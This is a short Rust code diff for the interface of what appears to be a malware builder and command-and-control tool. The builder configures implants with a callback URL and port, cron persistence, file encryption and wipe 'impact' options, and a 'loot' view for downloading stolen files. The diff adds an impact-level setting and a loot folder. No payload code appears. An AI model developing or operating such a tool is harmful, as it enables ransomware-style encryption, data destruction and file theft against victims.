@@ -25,6 +25,7 @@ pub enum Command {
 
         // impact
         impact: bool,
+        impact_level: String,
         impact_encrypt: bool,
         encryption_algo: String,
         impact_wipe: bool,
@@ -240,7 +241,7 @@ fn handle_enter(app: &mut AppState) -> Option<Command> {
 
                 return None;
             }
-            
+
             match app.builder.selected_field {
                 BuilderField::Url | BuilderField::Port => app.builder.next_field(),
                 _ => handle_builder_toggle(app)
@@ -250,7 +251,10 @@ fn handle_enter(app: &mut AppState) -> Option<Command> {
             let filtered = app.loot.filtered_files();
             if let Some(i) = app.loot.list_state.selected() {
                 if let Some(filename) = filtered.get(i) {
-                    let dest = format!("./{}", filename);
+                    let _ = std::fs::create_dir_all("loot");
+
+                    let dest = format!("loot/{}", filename);
+                    
                     app.status_message = format!("Downloading {}...", filename);
                     return Some(Command::DownloadLoot(filename.clone(), dest));
                 }
@@ -424,6 +428,12 @@ fn handle_builder_toggle(app: &mut AppState) {
                 app.builder.impact_wipe = false;
             }
         },
+        ImpactLevel => {
+            let levels = ["TEST", "USER", "SYSTEM"];
+            let current_idx = levels.iter().position(|&l| l == app.builder.impact_level).unwrap_or(0);
+            let next_idx = (current_idx + 1) % levels.len();
+            app.builder.impact_level = levels[next_idx].to_string();
+        },
         ImpactEncrypt => app.builder.impact_encrypt = !app.builder.impact_encrypt,
 
         ImpactEncryptAlgoXor => app.builder.encryption_algo = "XOR".to_string(),
@@ -461,6 +471,7 @@ fn handle_build_start(app: &mut AppState) -> Option<Command> {
         persist_cron: app.builder.persist_cron,
 
         impact: app.builder.enable_impact,
+        impact_level: app.builder.impact_level.clone(),
         impact_encrypt: app.builder.impact_encrypt,
         encryption_algo: app.builder.encryption_algo.clone(),
         impact_wipe: app.builder.impact_wipe,
